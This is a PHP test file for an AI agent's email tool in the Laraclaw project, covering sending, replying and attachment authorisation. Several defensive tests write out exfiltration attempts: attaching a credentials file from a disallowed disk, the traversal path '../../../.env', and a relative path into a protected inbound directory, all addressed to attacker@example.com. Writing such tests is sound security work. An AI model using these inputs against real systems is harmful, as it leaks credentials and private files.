<?php

use DirectoryTree\ImapEngine\Address;
use DirectoryTree\ImapEngine\FolderInterface;
use DirectoryTree\ImapEngine\FolderRepositoryInterface;
use DirectoryTree\ImapEngine\Laravel\ImapManager;
use DirectoryTree\ImapEngine\MailboxInterface;
use DirectoryTree\ImapEngine\MessageInterface;
use DirectoryTree\ImapEngine\MessageQueryInterface;
use Illuminate\Mail\Events\MessageSending;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Storage;
use Laraclaw\DTOs\Attachment;
use Laraclaw\DTOs\IncomingMessage;
use Laraclaw\Enums\ConnectorType;
use Laraclaw\Tools\EmailManager;
use Laravel\Ai\Tools\Request;
use Symfony\Component\Mime\Email;

function emailRequest(array $data): Request
{
    return new Request($data, 'call_test');
}

function emailTool(?IncomingMessage $message = null): EmailManager
{
    $message ??= new IncomingMessage(
        text: 'test',
        connector: ConnectorType::Telegram,
        key: 'user-123',
        isDirectMessage: true,
    );

    return new EmailManager($message, 'default');
}

// ── send ────────────────────────────────────────────────────────────────────

it('sends an email and returns a confirmation', function () {
    $result = emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['to@example.com'],
        'subject' => 'Hello',
        'body' => 'World',
    ]));

    expect($result)->toContain('Email sent to to@example.com');
});

it('requires to for send', function () {
    $result = emailTool()->handle(emailRequest([
        'operation' => 'send',
        'subject' => 'Hello',
        'body' => 'World',
    ]));

    expect($result)->toContain('"to" parameter is required');
});

it('requires subject for send', function () {
    $result = emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['to@example.com'],
        'body' => 'World',
    ]));

    expect($result)->toContain('"subject" parameter is required');
});

it('requires body for send', function () {
    $result = emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['to@example.com'],
        'subject' => 'Hello',
    ]));

    expect($result)->toContain('"body" parameter is required');
});

it('attaches message attachments when sending an email', function () {
    Storage::fake('local');
    Storage::disk('local')->put('attachments/test/photo.jpg', 'fake-image-data');

    $attachment = new Attachment(
        path: 'attachments/test/photo.jpg',
        disk: 'local',
        mimeType: 'image/jpeg',
        filename: 'photo.jpg',
    );

    $message = new IncomingMessage(
        text: 'test',
        connector: ConnectorType::Telegram,
        key: 'user-123',
        isDirectMessage: true,
        attachments: [$attachment],
    );

    $captured = null;
    Event::listen(MessageSending::class, function (MessageSending $e) use (&$captured) {
        $captured = $e->message;
    });

    $result = emailTool($message)->handle(emailRequest([
        'operation' => 'send',
        'to' => ['to@example.com'],
        'subject' => 'See attached',
        'body' => 'Here is the file.',
    ]));

    expect($result)->toContain('Email sent');
    expect($captured)->toBeInstanceOf(Email::class);

    $parts = $captured->getAttachments();
    expect($parts)->toHaveCount(1);
    expect($parts[0]->getFilename())->toBe('photo.jpg');
    expect($parts[0]->getMediaType() . '/' . $parts[0]->getMediaSubtype())->toBe('image/jpeg');
    expect($parts[0]->getBody())->toBe('fake-image-data');
});

it('attaches files passed explicitly via the attachments parameter', function () {
    Storage::fake('local');
    Storage::disk('local')->put('attachments/telegram/uuid/logo.png', 'logo-data');

    $captured = null;
    Event::listen(MessageSending::class, function (MessageSending $e) use (&$captured) {
        $captured = $e->message;
    });

    emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['to@example.com'],
        'subject' => 'Here are the logos',
        'body' => 'See attached.',
        'attachments' => [
            ['disk' => 'local', 'path' => 'attachments/telegram/uuid/logo.png', 'filename' => 'logo.png', 'mime_type' => 'image/png'],
        ],
    ]));

    expect($captured)->toBeInstanceOf(Email::class);
    $parts = $captured->getAttachments();
    expect($parts)->toHaveCount(1);
    expect($parts[0]->getFilename())->toBe('logo.png');
    expect($parts[0]->getMediaType() . '/' . $parts[0]->getMediaSubtype())->toBe('image/png');
    expect($parts[0]->getBody())->toBe('logo-data');
});

// ── attachment authorization ────────────────────────────────────────────────

it('refuses to attach a file from a disk that is not on the allowlist', function () {
    Storage::fake('local');
    Storage::fake('secrets');
    Storage::disk('secrets')->put('credentials.env', 'APP_KEY=super-secret');

    config(['laraclaw.filesystem.allowed_disks' => ['local']]);

    Event::listen(MessageSending::class, function (): void {
        throw new RuntimeException('The email should never have been sent.');
    });

    $result = emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['attacker@example.com'],
        'subject' => 'Exfiltration',
        'body' => 'See attached.',
        'attachments' => [
            ['disk' => 'secrets', 'path' => 'credentials.env'],
        ],
    ]));

    expect($result)->toContain("Disk 'secrets' is not allowed");
});

it('refuses to attach a file outside the disk root', function () {
    Storage::fake('local');

    config(['laraclaw.filesystem.allowed_disks' => ['local']]);

    Event::listen(MessageSending::class, function (): void {
        throw new RuntimeException('The email should never have been sent.');
    });

    $result = emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['attacker@example.com'],
        'subject' => 'Exfiltration',
        'body' => 'See attached.',
        'attachments' => [
            ['disk' => 'local', 'path' => '../../../.env'],
        ],
    ]));

    expect($result)->toContain('Path traversal is not allowed');
});

it('refuses to attach a file from a protected attachments directory', function () {
    Storage::fake('local');
    Storage::disk('local')->put('inbound/someone-elses-file.pdf', 'private-data');

    config([
        'laraclaw.filesystem.allowed_disks' => ['local'],
        'laraclaw.filesystem.incoming_attachments_path' => 'inbound',
        'laraclaw.filesystem.outgoing_attachments_path' => 'outbound',
    ]);

    Event::listen(MessageSending::class, function (): void {
        throw new RuntimeException('The email should never have been sent.');
    });

    $result = emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['attacker@example.com'],
        'subject' => 'Exfiltration',
        'body' => 'See attached.',
        'attachments' => [
            ['disk' => 'local', 'path' => 'inbound/someone-elses-file.pdf'],
        ],
    ]));

    expect($result)->toContain('Cannot read system directory');
});

it('refuses to attach a protected file reached through a relative path', function () {
    Storage::fake('local');
    Storage::disk('local')->put('inbound/someone-elses-file.pdf', 'private-data');

    config([
        'laraclaw.filesystem.allowed_disks' => ['local'],
        'laraclaw.filesystem.incoming_attachments_path' => 'inbound',
        'laraclaw.filesystem.outgoing_attachments_path' => 'outbound',
    ]);

    Event::listen(MessageSending::class, function (): void {
        throw new RuntimeException('The email should never have been sent.');
    });

    // This one stays inside the disk root, so the traversal check is happy with it.
    // Only collapsing the path first reveals that it lands in a protected directory.
    $result = emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['attacker@example.com'],
        'subject' => 'Exfiltration',
        'body' => 'See attached.',
        'attachments' => [
            ['disk' => 'local', 'path' => 'reports/../inbound/someone-elses-file.pdf'],
        ],
    ]));

    expect($result)->toContain('Cannot read system directory');
});

it('reports a missing attachment instead of throwing', function () {
    Storage::fake('local');

    config(['laraclaw.filesystem.allowed_disks' => ['local']]);

    $result = emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['to@example.com'],
        'subject' => 'Missing file',
        'body' => 'See attached.',
        'attachments' => [
            ['disk' => 'local', 'path' => 'reports/nope.pdf'],
        ],
    ]));

    expect($result)->toContain('file not found on disk');
});

it('still attaches a file that passes every filesystem check', function () {
    Storage::fake('local');
    Storage::disk('local')->put('reports/q3.pdf', 'report-data');

    config(['laraclaw.filesystem.allowed_disks' => ['local']]);

    $captured = null;
    Event::listen(MessageSending::class, function (MessageSending $e) use (&$captured) {
        $captured = $e->message;
    });

    $result = emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['to@example.com'],
        'subject' => 'Quarterly report',
        'body' => 'See attached.',
        'attachments' => [
            ['disk' => 'local', 'path' => 'reports/q3.pdf', 'filename' => 'q3.pdf', 'mime_type' => 'application/pdf'],
        ],
    ]));

    expect($result)->toContain('Email sent');
    expect($captured)->toBeInstanceOf(Email::class);

    $parts = $captured->getAttachments();
    expect($parts)->toHaveCount(1);
    expect($parts[0]->getFilename())->toBe('q3.pdf');
    expect($parts[0]->getBody())->toBe('report-data');
});

it('refuses a disallowed attachment on reply as well as send', function () {
    Storage::fake('local');
    Storage::fake('secrets');
    Storage::disk('secrets')->put('credentials.env', 'APP_KEY=super-secret');

    config(['laraclaw.filesystem.allowed_disks' => ['local']]);

    Event::listen(MessageSending::class, function (): void {
        throw new RuntimeException('The email should never have been sent.');
    });

    $result = emailTool()->handle(emailRequest([
        'operation' => 'reply',
        'uid' => 1,
        'body' => 'See attached.',
        'attachments' => [
            ['disk' => 'secrets', 'path' => 'credentials.env'],
        ],
    ]));

    expect($result)->toContain("Disk 'secrets' is not allowed");
});

it('sends without attachments when the message has none', function () {
    $captured = null;
    Event::listen(MessageSending::class, function (MessageSending $e) use (&$captured) {
        $captured = $e->message;
    });

    emailTool()->handle(emailRequest([
        'operation' => 'send',
        'to' => ['to@example.com'],
        'subject' => 'No files',
        'body' => 'Plain text.',
    ]));

    expect($captured)->toBeInstanceOf(Email::class);
    expect($captured->getAttachments())->toBeEmpty();
});

// ── reply ───────────────────────────────────────────────────────────────────

it('attaches message attachments when replying', function () {
    Storage::fake('local');
    Storage::disk('local')->put('attachments/test/doc.pdf', 'fake-pdf-data');

    config(['imap.mailboxes.default' => ['username' => null]]);

    $attachment = new Attachment(
        path: 'attachments/test/doc.pdf',
        disk: 'local',
        mimeType: 'application/pdf',
        filename: 'doc.pdf',
    );

    $message = new IncomingMessage(
        text: 'test',
        connector: ConnectorType::Telegram,
        key: 'user-123',
        isDirectMessage: true,
        attachments: [$attachment],
    );

    $from = new Address('sender@example.com', 'Sender');

    $original = Mockery::mock(MessageInterface::class);
    $original->allows('replyTo')->andReturn(null);
    $original->allows('from')->andReturn($from);
    $original->allows('subject')->andReturn('Original subject');
    $original->allows('messageId')->andReturn('<original-id@example.com>');
    $original->allows('markAnswered');

    $query = Mockery::mock(MessageQueryInterface::class);
    $query->allows('withHeaders')->andReturnSelf();
    $query->allows('withBody')->andReturnSelf();
    $query->allows('find')->andReturn($original);

    $folder = Mockery::mock(FolderInterface::class);
    $folder->allows('messages')->andReturn($query);

    $folderRepo = Mockery::mock(FolderRepositoryInterface::class);
    $folderRepo->allows('findOrFail')->andReturn($folder);

    $mailbox = Mockery::mock(MailboxInterface::class);
    $mailbox->allows('folders')->andReturn($folderRepo);

    $imapManager = Mockery::mock(ImapManager::class);
    $imapManager->allows('mailbox')->andReturn($mailbox);
    app()->instance(ImapManager::class, $imapManager);

    $captured = null;
    Event::listen(MessageSending::class, function (MessageSending $e) use (&$captured) {
        $captured = $e->message;
    });

    $result = emailTool($message)->handle(emailRequest([
        'operation' => 'reply',
        'uid' => 42,
        'body' => 'Here is the file.',
    ]));

    expect($result)->not->toContain('failed');
    expect($captured)->toBeInstanceOf(Email::class);

    $parts = $captured->getAttachments();
    expect($parts)->toHaveCount(1);
    expect($parts[0]->getFilename())->toBe('doc.pdf');
    expect($parts[0]->getMediaType() . '/' . $parts[0]->getMediaSubtype())->toBe('application/pdf');
    expect($parts[0]->getBody())->toBe('fake-pdf-data');
});
